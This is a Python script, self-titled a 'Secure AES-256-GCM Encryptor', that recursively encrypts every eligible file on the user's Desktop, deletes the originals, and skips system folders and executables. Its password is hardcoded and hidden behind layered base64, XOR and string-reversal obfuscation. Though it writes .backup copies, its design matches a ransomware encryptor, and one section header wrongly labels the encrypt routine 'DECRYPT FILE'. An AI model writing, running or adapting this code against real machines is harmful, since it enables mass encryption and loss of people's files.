import os
import json
import base64
import shutil
import secrets
from pathlib import Path

from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.backends import default_backend


ITERATIONS = 600000
NONCE_SIZE = 12
SALT_SIZE = 16
KEY_SIZE = 32
EXTENSION = ".encrypted"



SKIP_FILES = {"desktop.ini", "thumbs.db", ".ds_store", "SALT.KEY"}
SKIP_EXTENSIONS = {".exe", ".dll", ".sys", ".bat", ".cmd"}
SKIP_DIRS = {
    "windows", "program files", "program files (x86)", 
    "appdata", "$recycle.bin", "system volume information"
}

# =========================
# STRONGER OBFUSCATION
# =========================
def get_password():
    
    encoded = "X15eXl5eXl5eXl5eXg=="
    data = base64.b64decode(encoded)
    
    key = 0x5A
    decrypted = bytes(b ^ key for b in data)
    
    result = decrypted.decode('utf-8')
    result = result[::-1]
    result = result.replace("X", "")
    result = result[2:] + result[:2]
    
    return result

PASSWORD = get_password()

# =========================
# KEY
# =========================

def derive_key(password: str, salt: bytes) -> bytes:
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=KEY_SIZE,
        salt=salt,
        iterations=ITERATIONS,
        backend=default_backend(),
    )
    return kdf.derive(password.encode())

# =========================
# VERIFY 
# =========================

def verify_encryption(encrypted_path: Path, key: bytes) -> bool:
    try:
        with open(encrypted_path, "r", encoding="utf-8") as f:
            package = json.load(f)
        
        if "metadata" not in package or "ciphertext" not in package:
            return False
        if "nonce" not in package["metadata"]:
            return False
        
        nonce = base64.b64decode(package["metadata"]["nonce"])
        ciphertext = base64.b64decode(package["ciphertext"])
        
        AESGCM(key).decrypt(nonce, ciphertext, None)
        return True
    except Exception:
        return False

# =========================
# DECRYPT FILE
# =========================

def encrypt_file(file_path: Path, key: bytes):
    try:
        if not file_path.is_file():
            return False
        if file_path.name.endswith(EXTENSION) or file_path.name.endswith(".backup"):
            return False
        if file_path.name.lower() in {x.lower() for x in SKIP_FILES}:
            return False
        if file_path.suffix.lower() in SKIP_EXTENSIONS:
            return False

        
        with open(file_path, "rb") as f:
            plaintext = f.read()

        backup_path = file_path.with_suffix(file_path.suffix + ".backup")
        if not backup_path.exists():
            shutil.copy2(file_path, backup_path)

        nonce = secrets.token_bytes(NONCE_SIZE)
        ciphertext = AESGCM(key).encrypt(nonce, plaintext, None)

        encrypted_path = Path(str(file_path) + EXTENSION)

        metadata = {
            "version": 3,
            "algorithm": "AES-256-GCM",
            "kdf": "PBKDF2-SHA256",
            "iterations": ITERATIONS,
            "nonce": base64.b64encode(nonce).decode()
        }
        package = {
            "metadata": metadata,
            "ciphertext": base64.b64encode(ciphertext).decode()
        }

        with open(encrypted_path, "w", encoding="utf-8") as f:
            json.dump(package, f, indent=2)

        if not verify_encryption(encrypted_path, key):
            encrypted_path.unlink(missing_ok=True)
            print(f"[VERIFICATION FAILED] {file_path}")
            return False

        file_path.unlink()
        print(f"[ENCRYPTED] {file_path}")
        return True

    except Exception as e:
        print(f"[ERROR] {file_path} -> {e}")
        return False

# =========================
# MAIN
# =========================

def main():
    print("=== Secure AES-256-GCM Encryptor ===\n")

    
    desktop = os.path.join(os.path.expanduser("~"), "Desktop")
    target_path = Path(desktop)

    if not target_path.exists():
        print("❌ not found.")
        return

    print(f"Target: {target_path.resolve()}")
    print("  Backups (.backup) will be created.\n")

    salt_file = target_path / "SALT.KEY"
    if salt_file.exists():
        print("❌ SALT.KEY already exists. Refusing to overwrite.")
        return

    salt = secrets.token_bytes(SALT_SIZE)
    with open(salt_file, "wb") as f:
        f.write(salt)

    key = derive_key(PASSWORD, salt)

    encrypted_count = 0
    failed_count = 0

    print("Starting encryption\n")

    for root, dirs, files in os.walk(desktop, topdown=True):
        dirs[:] = [d for d in dirs if d.lower() not in SKIP_DIRS]
        
        for file in files:
            path = Path(root) / file
            if encrypt_file(path, key):
                encrypted_count += 1
            else:
                failed_count += 1

    print("\n" + "="*50)
    print("ENCRYPTION COMPLETE")
    print("="*50)
    print(f"Successfully Encrypted : {encrypted_count}")
    print(f"Failed / Skipped       : {failed_count}")
    print(f"Salt File              : {salt_file}")
    print("\nKeep SALT.KEY safe!")

if __name__ == "__main__":
    main()